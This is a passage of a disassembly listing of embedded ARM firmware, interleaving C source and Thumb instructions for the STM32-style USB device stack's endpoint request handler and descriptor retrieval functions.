 800baf0:	e040      	b.n	800bb74 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800baf2:	6839      	ldr	r1, [r7, #0]
 800baf4:	6878      	ldr	r0, [r7, #4]
 800baf6:	f000 fc68 	bl	800c3ca <USBD_CtlError>
              break;
 800bafa:	e03b      	b.n	800bb74 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800bafc:	683b      	ldr	r3, [r7, #0]
 800bafe:	885b      	ldrh	r3, [r3, #2]
 800bb00:	2b00      	cmp	r3, #0
 800bb02:	d136      	bne.n	800bb72 <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800bb04:	7bbb      	ldrb	r3, [r7, #14]
 800bb06:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bb0a:	2b00      	cmp	r3, #0
 800bb0c:	d004      	beq.n	800bb18 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800bb0e:	7bbb      	ldrb	r3, [r7, #14]
 800bb10:	4619      	mov	r1, r3
 800bb12:	6878      	ldr	r0, [r7, #4]
 800bb14:	f001 fa02 	bl	800cf1c <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800bb18:	6878      	ldr	r0, [r7, #4]
 800bb1a:	f000 fd21 	bl	800c560 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800bb1e:	7bbb      	ldrb	r3, [r7, #14]
 800bb20:	4619      	mov	r1, r3
 800bb22:	6878      	ldr	r0, [r7, #4]
 800bb24:	f7ff fde1 	bl	800b6ea <USBD_CoreFindEP>
 800bb28:	4603      	mov	r3, r0
 800bb2a:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800bb2c:	7b7b      	ldrb	r3, [r7, #13]
 800bb2e:	2bff      	cmp	r3, #255	; 0xff
 800bb30:	d01f      	beq.n	800bb72 <USBD_StdEPReq+0x1c6>
 800bb32:	7b7b      	ldrb	r3, [r7, #13]
 800bb34:	2b00      	cmp	r3, #0
 800bb36:	d11c      	bne.n	800bb72 <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800bb38:	7b7a      	ldrb	r2, [r7, #13]
 800bb3a:	687b      	ldr	r3, [r7, #4]
 800bb3c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800bb40:	7b7a      	ldrb	r2, [r7, #13]
 800bb42:	687b      	ldr	r3, [r7, #4]
 800bb44:	32ae      	adds	r2, #174	; 0xae
 800bb46:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bb4a:	689b      	ldr	r3, [r3, #8]
 800bb4c:	2b00      	cmp	r3, #0
 800bb4e:	d010      	beq.n	800bb72 <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800bb50:	7b7a      	ldrb	r2, [r7, #13]
 800bb52:	687b      	ldr	r3, [r7, #4]
 800bb54:	32ae      	adds	r2, #174	; 0xae
 800bb56:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bb5a:	689b      	ldr	r3, [r3, #8]
 800bb5c:	6839      	ldr	r1, [r7, #0]
 800bb5e:	6878      	ldr	r0, [r7, #4]
 800bb60:	4798      	blx	r3
 800bb62:	4603      	mov	r3, r0
 800bb64:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800bb66:	e004      	b.n	800bb72 <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800bb68:	6839      	ldr	r1, [r7, #0]
 800bb6a:	6878      	ldr	r0, [r7, #4]
 800bb6c:	f000 fc2d 	bl	800c3ca <USBD_CtlError>
              break;
 800bb70:	e000      	b.n	800bb74 <USBD_StdEPReq+0x1c8>
              break;
 800bb72:	bf00      	nop
          }
          break;
 800bb74:	e0ab      	b.n	800bcce <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800bb76:	687b      	ldr	r3, [r7, #4]
 800bb78:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bb7c:	b2db      	uxtb	r3, r3
 800bb7e:	2b02      	cmp	r3, #2
 800bb80:	d002      	beq.n	800bb88 <USBD_StdEPReq+0x1dc>
 800bb82:	2b03      	cmp	r3, #3
 800bb84:	d032      	beq.n	800bbec <USBD_StdEPReq+0x240>
 800bb86:	e097      	b.n	800bcb8 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bb88:	7bbb      	ldrb	r3, [r7, #14]
 800bb8a:	2b00      	cmp	r3, #0
 800bb8c:	d007      	beq.n	800bb9e <USBD_StdEPReq+0x1f2>
 800bb8e:	7bbb      	ldrb	r3, [r7, #14]
 800bb90:	2b80      	cmp	r3, #128	; 0x80
 800bb92:	d004      	beq.n	800bb9e <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800bb94:	6839      	ldr	r1, [r7, #0]
 800bb96:	6878      	ldr	r0, [r7, #4]
 800bb98:	f000 fc17 	bl	800c3ca <USBD_CtlError>
                break;
 800bb9c:	e091      	b.n	800bcc2 <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bb9e:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bba2:	2b00      	cmp	r3, #0
 800bba4:	da0b      	bge.n	800bbbe <USBD_StdEPReq+0x212>
 800bba6:	7bbb      	ldrb	r3, [r7, #14]
 800bba8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bbac:	4613      	mov	r3, r2
 800bbae:	009b      	lsls	r3, r3, #2
 800bbb0:	4413      	add	r3, r2
 800bbb2:	009b      	lsls	r3, r3, #2
 800bbb4:	3310      	adds	r3, #16
 800bbb6:	687a      	ldr	r2, [r7, #4]
 800bbb8:	4413      	add	r3, r2
 800bbba:	3304      	adds	r3, #4
 800bbbc:	e00b      	b.n	800bbd6 <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bbbe:	7bbb      	ldrb	r3, [r7, #14]
 800bbc0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbc4:	4613      	mov	r3, r2
 800bbc6:	009b      	lsls	r3, r3, #2
 800bbc8:	4413      	add	r3, r2
 800bbca:	009b      	lsls	r3, r3, #2
 800bbcc:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bbd0:	687a      	ldr	r2, [r7, #4]
 800bbd2:	4413      	add	r3, r2
 800bbd4:	3304      	adds	r3, #4
 800bbd6:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800bbd8:	68bb      	ldr	r3, [r7, #8]
 800bbda:	2200      	movs	r2, #0
 800bbdc:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bbde:	68bb      	ldr	r3, [r7, #8]
 800bbe0:	2202      	movs	r2, #2
 800bbe2:	4619      	mov	r1, r3
 800bbe4:	6878      	ldr	r0, [r7, #4]
 800bbe6:	f000 fc61 	bl	800c4ac <USBD_CtlSendData>
              break;
 800bbea:	e06a      	b.n	800bcc2 <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800bbec:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bbf0:	2b00      	cmp	r3, #0
 800bbf2:	da11      	bge.n	800bc18 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800bbf4:	7bbb      	ldrb	r3, [r7, #14]
 800bbf6:	f003 020f 	and.w	r2, r3, #15
 800bbfa:	6879      	ldr	r1, [r7, #4]
 800bbfc:	4613      	mov	r3, r2
 800bbfe:	009b      	lsls	r3, r3, #2
 800bc00:	4413      	add	r3, r2
 800bc02:	009b      	lsls	r3, r3, #2
 800bc04:	440b      	add	r3, r1
 800bc06:	3324      	adds	r3, #36	; 0x24
 800bc08:	881b      	ldrh	r3, [r3, #0]
 800bc0a:	2b00      	cmp	r3, #0
 800bc0c:	d117      	bne.n	800bc3e <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bc0e:	6839      	ldr	r1, [r7, #0]
 800bc10:	6878      	ldr	r0, [r7, #4]
 800bc12:	f000 fbda 	bl	800c3ca <USBD_CtlError>
                  break;
 800bc16:	e054      	b.n	800bcc2 <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800bc18:	7bbb      	ldrb	r3, [r7, #14]
 800bc1a:	f003 020f 	and.w	r2, r3, #15
 800bc1e:	6879      	ldr	r1, [r7, #4]
 800bc20:	4613      	mov	r3, r2
 800bc22:	009b      	lsls	r3, r3, #2
 800bc24:	4413      	add	r3, r2
 800bc26:	009b      	lsls	r3, r3, #2
 800bc28:	440b      	add	r3, r1
 800bc2a:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800bc2e:	881b      	ldrh	r3, [r3, #0]
 800bc30:	2b00      	cmp	r3, #0
 800bc32:	d104      	bne.n	800bc3e <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bc34:	6839      	ldr	r1, [r7, #0]
 800bc36:	6878      	ldr	r0, [r7, #4]
 800bc38:	f000 fbc7 	bl	800c3ca <USBD_CtlError>
                  break;
 800bc3c:	e041      	b.n	800bcc2 <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bc3e:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bc42:	2b00      	cmp	r3, #0
 800bc44:	da0b      	bge.n	800bc5e <USBD_StdEPReq+0x2b2>
 800bc46:	7bbb      	ldrb	r3, [r7, #14]
 800bc48:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bc4c:	4613      	mov	r3, r2
 800bc4e:	009b      	lsls	r3, r3, #2
 800bc50:	4413      	add	r3, r2
 800bc52:	009b      	lsls	r3, r3, #2
 800bc54:	3310      	adds	r3, #16
 800bc56:	687a      	ldr	r2, [r7, #4]
 800bc58:	4413      	add	r3, r2
 800bc5a:	3304      	adds	r3, #4
 800bc5c:	e00b      	b.n	800bc76 <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bc5e:	7bbb      	ldrb	r3, [r7, #14]
 800bc60:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bc64:	4613      	mov	r3, r2
 800bc66:	009b      	lsls	r3, r3, #2
 800bc68:	4413      	add	r3, r2
 800bc6a:	009b      	lsls	r3, r3, #2
 800bc6c:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bc70:	687a      	ldr	r2, [r7, #4]
 800bc72:	4413      	add	r3, r2
 800bc74:	3304      	adds	r3, #4
 800bc76:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800bc78:	7bbb      	ldrb	r3, [r7, #14]
 800bc7a:	2b00      	cmp	r3, #0
 800bc7c:	d002      	beq.n	800bc84 <USBD_StdEPReq+0x2d8>
 800bc7e:	7bbb      	ldrb	r3, [r7, #14]
 800bc80:	2b80      	cmp	r3, #128	; 0x80
 800bc82:	d103      	bne.n	800bc8c <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800bc84:	68bb      	ldr	r3, [r7, #8]
 800bc86:	2200      	movs	r2, #0
 800bc88:	601a      	str	r2, [r3, #0]
 800bc8a:	e00e      	b.n	800bcaa <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800bc8c:	7bbb      	ldrb	r3, [r7, #14]
 800bc8e:	4619      	mov	r1, r3
 800bc90:	6878      	ldr	r0, [r7, #4]
 800bc92:	f001 f979 	bl	800cf88 <USBD_LL_IsStallEP>
 800bc96:	4603      	mov	r3, r0
 800bc98:	2b00      	cmp	r3, #0
 800bc9a:	d003      	beq.n	800bca4 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bc9c:	68bb      	ldr	r3, [r7, #8]
 800bc9e:	2201      	movs	r2, #1
 800bca0:	601a      	str	r2, [r3, #0]
 800bca2:	e002      	b.n	800bcaa <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800bca4:	68bb      	ldr	r3, [r7, #8]
 800bca6:	2200      	movs	r2, #0
 800bca8:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bcaa:	68bb      	ldr	r3, [r7, #8]
 800bcac:	2202      	movs	r2, #2
 800bcae:	4619      	mov	r1, r3
 800bcb0:	6878      	ldr	r0, [r7, #4]
 800bcb2:	f000 fbfb 	bl	800c4ac <USBD_CtlSendData>
              break;
 800bcb6:	e004      	b.n	800bcc2 <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bcb8:	6839      	ldr	r1, [r7, #0]
 800bcba:	6878      	ldr	r0, [r7, #4]
 800bcbc:	f000 fb85 	bl	800c3ca <USBD_CtlError>
              break;
 800bcc0:	bf00      	nop
          }
          break;
 800bcc2:	e004      	b.n	800bcce <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800bcc4:	6839      	ldr	r1, [r7, #0]
 800bcc6:	6878      	ldr	r0, [r7, #4]
 800bcc8:	f000 fb7f 	bl	800c3ca <USBD_CtlError>
          break;
 800bccc:	bf00      	nop
      }
      break;
 800bcce:	e005      	b.n	800bcdc <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bcd0:	6839      	ldr	r1, [r7, #0]
 800bcd2:	6878      	ldr	r0, [r7, #4]
 800bcd4:	f000 fb79 	bl	800c3ca <USBD_CtlError>
      break;
 800bcd8:	e000      	b.n	800bcdc <USBD_StdEPReq+0x330>
      break;
 800bcda:	bf00      	nop
  }

  return ret;
 800bcdc:	7bfb      	ldrb	r3, [r7, #15]
}
 800bcde:	4618      	mov	r0, r3
 800bce0:	3710      	adds	r7, #16
 800bce2:	46bd      	mov	sp, r7
 800bce4:	bd80      	pop	{r7, pc}
	...

0800bce8 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bce8:	b580      	push	{r7, lr}
 800bcea:	b084      	sub	sp, #16
 800bcec:	af00      	add	r7, sp, #0
 800bcee:	6078      	str	r0, [r7, #4]
 800bcf0:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bcf2:	2300      	movs	r3, #0
 800bcf4:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bcf6:	2300      	movs	r3, #0
 800bcf8:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bcfa:	2300      	movs	r3, #0
 800bcfc:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bcfe:	683b      	ldr	r3, [r7, #0]
 800bd00:	885b      	ldrh	r3, [r3, #2]
 800bd02:	0a1b      	lsrs	r3, r3, #8
 800bd04:	b29b      	uxth	r3, r3
 800bd06:	3b01      	subs	r3, #1
 800bd08:	2b0e      	cmp	r3, #14
 800bd0a:	f200 8152 	bhi.w	800bfb2 <USBD_GetDescriptor+0x2ca>
 800bd0e:	a201      	add	r2, pc, #4	; (adr r2, 800bd14 <USBD_GetDescriptor+0x2c>)
 800bd10:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bd14:	0800bd85 	.word	0x0800bd85
 800bd18:	0800bd9d 	.word	0x0800bd9d
 800bd1c:	0800bddd 	.word	0x0800bddd
 800bd20:	0800bfb3 	.word	0x0800bfb3
 800bd24:	0800bfb3 	.word	0x0800bfb3
 800bd28:	0800bf53 	.word	0x0800bf53
 800bd2c:	0800bf7f 	.word	0x0800bf7f
 800bd30:	0800bfb3 	.word	0x0800bfb3
 800bd34:	0800bfb3 	.word	0x0800bfb3
 800bd38:	0800bfb3 	.word	0x0800bfb3
 800bd3c:	0800bfb3 	.word	0x0800bfb3
 800bd40:	0800bfb3 	.word	0x0800bfb3
 800bd44:	0800bfb3 	.word	0x0800bfb3
 800bd48:	0800bfb3 	.word	0x0800bfb3
 800bd4c:	0800bd51 	.word	0x0800bd51
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bd50:	687b      	ldr	r3, [r7, #4]
 800bd52:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd56:	69db      	ldr	r3, [r3, #28]
 800bd58:	2b00      	cmp	r3, #0
 800bd5a:	d00b      	beq.n	800bd74 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bd5c:	687b      	ldr	r3, [r7, #4]
 800bd5e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd62:	69db      	ldr	r3, [r3, #28]
 800bd64:	687a      	ldr	r2, [r7, #4]
 800bd66:	7c12      	ldrb	r2, [r2, #16]
 800bd68:	f107 0108 	add.w	r1, r7, #8
 800bd6c:	4610      	mov	r0, r2
 800bd6e:	4798      	blx	r3
 800bd70:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd72:	e126      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd74:	6839      	ldr	r1, [r7, #0]
 800bd76:	6878      	ldr	r0, [r7, #4]
 800bd78:	f000 fb27 	bl	800c3ca <USBD_CtlError>
        err++;
 800bd7c:	7afb      	ldrb	r3, [r7, #11]
 800bd7e:	3301      	adds	r3, #1
 800bd80:	72fb      	strb	r3, [r7, #11]
      break;
 800bd82:	e11e      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bd84:	687b      	ldr	r3, [r7, #4]
 800bd86:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd8a:	681b      	ldr	r3, [r3, #0]
 800bd8c:	687a      	ldr	r2, [r7, #4]
 800bd8e:	7c12      	ldrb	r2, [r2, #16]
 800bd90:	f107 0108 	add.w	r1, r7, #8
 800bd94:	4610      	mov	r0, r2
 800bd96:	4798      	blx	r3
 800bd98:	60f8      	str	r0, [r7, #12]
      break;
 800bd9a:	e112      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd9c:	687b      	ldr	r3, [r7, #4]
 800bd9e:	7c1b      	ldrb	r3, [r3, #16]
 800bda0:	2b00      	cmp	r3, #0
 800bda2:	d10d      	bne.n	800bdc0 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bda4:	687b      	ldr	r3, [r7, #4]
 800bda6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bdaa:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bdac:	f107 0208 	add.w	r2, r7, #8
 800bdb0:	4610      	mov	r0, r2
 800bdb2:	4798      	blx	r3
 800bdb4:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bdb6:	68fb      	ldr	r3, [r7, #12]
 800bdb8:	3301      	adds	r3, #1
 800bdba:	2202      	movs	r2, #2
 800bdbc:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bdbe:	e100      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bdc0:	687b      	ldr	r3, [r7, #4]
 800bdc2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bdc6:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bdc8:	f107 0208 	add.w	r2, r7, #8
 800bdcc:	4610      	mov	r0, r2
 800bdce:	4798      	blx	r3
 800bdd0:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bdd2:	68fb      	ldr	r3, [r7, #12]
 800bdd4:	3301      	adds	r3, #1
 800bdd6:	2202      	movs	r2, #2
 800bdd8:	701a      	strb	r2, [r3, #0]
      break;
 800bdda:	e0f2      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bddc:	683b      	ldr	r3, [r7, #0]
 800bdde:	885b      	ldrh	r3, [r3, #2]
 800bde0:	b2db      	uxtb	r3, r3
 800bde2:	2b05      	cmp	r3, #5
 800bde4:	f200 80ac 	bhi.w	800bf40 <USBD_GetDescriptor+0x258>
 800bde8:	a201      	add	r2, pc, #4	; (adr r2, 800bdf0 <USBD_GetDescriptor+0x108>)
 800bdea:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bdee:	bf00      	nop
 800bdf0:	0800be09 	.word	0x0800be09
 800bdf4:	0800be3d 	.word	0x0800be3d
 800bdf8:	0800be71 	.word	0x0800be71
 800bdfc:	0800bea5 	.word	0x0800bea5
 800be00:	0800bed9 	.word	0x0800bed9
 800be04:	0800bf0d 	.word	0x0800bf0d
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800be08:	687b      	ldr	r3, [r7, #4]
 800be0a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be0e:	685b      	ldr	r3, [r3, #4]
 800be10:	2b00      	cmp	r3, #0
 800be12:	d00b      	beq.n	800be2c <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800be14:	687b      	ldr	r3, [r7, #4]
 800be16:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be1a:	685b      	ldr	r3, [r3, #4]
 800be1c:	687a      	ldr	r2, [r7, #4]
 800be1e:	7c12      	ldrb	r2, [r2, #16]
 800be20:	f107 0108 	add.w	r1, r7, #8
 800be24:	4610      	mov	r0, r2
 800be26:	4798      	blx	r3
 800be28:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be2a:	e091      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be2c:	6839      	ldr	r1, [r7, #0]
 800be2e:	6878      	ldr	r0, [r7, #4]
 800be30:	f000 facb 	bl	800c3ca <USBD_CtlError>
            err++;
 800be34:	7afb      	ldrb	r3, [r7, #11]
 800be36:	3301      	adds	r3, #1
 800be38:	72fb      	strb	r3, [r7, #11]
          break;
 800be3a:	e089      	b.n	800bf50 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800be3c:	687b      	ldr	r3, [r7, #4]
 800be3e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be42:	689b      	ldr	r3, [r3, #8]
 800be44:	2b00      	cmp	r3, #0
 800be46:	d00b      	beq.n	800be60 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800be48:	687b      	ldr	r3, [r7, #4]
 800be4a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be4e:	689b      	ldr	r3, [r3, #8]
 800be50:	687a      	ldr	r2, [r7, #4]
 800be52:	7c12      	ldrb	r2, [r2, #16]
 800be54:	f107 0108 	add.w	r1, r7, #8
 800be58:	4610      	mov	r0, r2
 800be5a:	4798      	blx	r3
 800be5c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be5e:	e077      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be60:	6839      	ldr	r1, [r7, #0]
 800be62:	6878      	ldr	r0, [r7, #4]
 800be64:	f000 fab1 	bl	800c3ca <USBD_CtlError>
            err++;
 800be68:	7afb      	ldrb	r3, [r7, #11]
 800be6a:	3301      	adds	r3, #1
 800be6c:	72fb      	strb	r3, [r7, #11]
          break;
 800be6e:	e06f      	b.n	800bf50 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800be70:	687b      	ldr	r3, [r7, #4]
 800be72:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be76:	68db      	ldr	r3, [r3, #12]
 800be78:	2b00      	cmp	r3, #0
 800be7a:	d00b      	beq.n	800be94 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800be7c:	687b      	ldr	r3, [r7, #4]
 800be7e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be82:	68db      	ldr	r3, [r3, #12]
 800be84:	687a      	ldr	r2, [r7, #4]
 800be86:	7c12      	ldrb	r2, [r2, #16]
 800be88:	f107 0108 	add.w	r1, r7, #8
 800be8c:	4610      	mov	r0, r2
 800be8e:	4798      	blx	r3
 800be90:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be92:	e05d      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be94:	6839      	ldr	r1, [r7, #0]
 800be96:	6878      	ldr	r0, [r7, #4]
 800be98:	f000 fa97 	bl	800c3ca <USBD_CtlError>
            err++;
 800be9c:	7afb      	ldrb	r3, [r7, #11]
 800be9e:	3301      	adds	r3, #1
 800bea0:	72fb      	strb	r3, [r7, #11]
          break;
 800bea2:	e055      	b.n	800bf50 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bea4:	687b      	ldr	r3, [r7, #4]
 800bea6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800beaa:	691b      	ldr	r3, [r3, #16]
 800beac:	2b00      	cmp	r3, #0
 800beae:	d00b      	beq.n	800bec8 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800beb0:	687b      	ldr	r3, [r7, #4]
 800beb2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800beb6:	691b      	ldr	r3, [r3, #16]
 800beb8:	687a      	ldr	r2, [r7, #4]
 800beba:	7c12      	ldrb	r2, [r2, #16]
 800bebc:	f107 0108 	add.w	r1, r7, #8
 800bec0:	4610      	mov	r0, r2
 800bec2:	4798      	blx	r3
 800bec4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bec6:	e043      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bec8:	6839      	ldr	r1, [r7, #0]
 800beca:	6878      	ldr	r0, [r7, #4]
 800becc:	f000 fa7d 	bl	800c3ca <USBD_CtlError>
            err++;
 800bed0:	7afb      	ldrb	r3, [r7, #11]
 800bed2:	3301      	adds	r3, #1
 800bed4:	72fb      	strb	r3, [r7, #11]
          break;
 800bed6:	e03b      	b.n	800bf50 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bed8:	687b      	ldr	r3, [r7, #4]
 800beda:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bede:	695b      	ldr	r3, [r3, #20]
 800bee0:	2b00      	cmp	r3, #0
 800bee2:	d00b      	beq.n	800befc <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bee4:	687b      	ldr	r3, [r7, #4]
 800bee6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800beea:	695b      	ldr	r3, [r3, #20]
 800beec:	687a      	ldr	r2, [r7, #4]
 800beee:	7c12      	ldrb	r2, [r2, #16]
 800bef0:	f107 0108 	add.w	r1, r7, #8
 800bef4:	4610      	mov	r0, r2
